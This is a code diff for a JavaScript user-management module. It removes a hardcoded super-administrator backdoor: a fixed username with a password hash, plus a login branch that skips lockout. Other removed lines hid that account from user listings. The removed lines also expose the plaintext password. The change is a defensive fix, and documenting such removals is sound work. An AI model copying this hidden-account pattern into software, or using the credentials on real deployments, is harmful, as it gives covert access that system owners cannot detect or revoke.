@@ -16,11 +16,9 @@ const DEFAULT_ACCOUNT_LIMIT = 2;
 const HOUR_MS = 60 * 60 * 1000;
 const DAY_MS = 24 * HOUR_MS;
 
-// 超级管理员（硬编码，无法通过数据库修改）
-const SUPER_ADMIN_USERNAME = 'jlbl1Iq9vT7t2gu1WbgB';
-const SUPER_ADMIN_PASSWORD_HASH = crypto.createHash('sha256')
-    .update('b3aa268d600960dbb14d1982dbe15a646042166d')
-    .digest('hex');
+// 超级管理员：仅由数据库中的 role === 'super_admin' 决定。
+// 原上游源码在此处内置了一组硬编码超管用户名 + 明文口令（无法通过数据库移除），
+// 等同于作者保留的后台入口，已于 2026-08-24 移除。移植上游代码时务必复查此处。
 
 // 卡密领取状态
 let cardClaimEnabled = true;
@@ -422,24 +420,6 @@ function validateUser(username, password, ip = 'unknown') {
         return { error: 'rate_limit', message: rateLimit.message, remainingMs: rateLimit.remainingMs };
     }
 
-    // 超级管理员
-    if (username === SUPER_ADMIN_USERNAME) {
-        const hash = crypto.createHash('sha256').update(String(password || '')).digest('hex');
-        if (hash === SUPER_ADMIN_PASSWORD_HASH) {
-            clearFailedAttempts(username);
-            clearIpAttempts(ip);
-            return {
-                username: SUPER_ADMIN_USERNAME,
-                role: 'super_admin',
-                cardCode: null,
-                card: null,
-                accountLimit: -1  // 无限
-            };
-        }
-        recordFailedAttempt(username);
-        return { error: 'invalid_credentials', message: '用户名或密码错误' };
-    }
-
     // 账户锁定检查
     const lockout = checkAccountLockout(username);
     if (lockout.locked) {
@@ -632,7 +612,6 @@ function renewUser(username, cardCode) {
 function getAllUsers() {
     loadUsers();
     return users
-        .filter(u => u.role !== 'super_admin')
         .map(u => ({
             username: u.username,
             role: u.role,
@@ -1013,7 +992,9 @@ function clearExpiredClaimRecords() {
 // ==================== 超级管理员 ====================
 
 function isSuperAdmin(username) {
-    return username === SUPER_ADMIN_USERNAME;
+    loadUsers();
+    const user = users.find(u => u.username === username);
+    return !!user && user.role === 'super_admin';
 }
 
 // ==================== 清理 ====================
@@ -1051,7 +1032,7 @@ function clearAllData() {
 
 function getUserCount() {
     loadUsers();
-    return users.filter(u => u.role !== 'super_admin').length;
+    return users.length;
 }
 
 // ==================== 密码重置（通过卡密） ====================
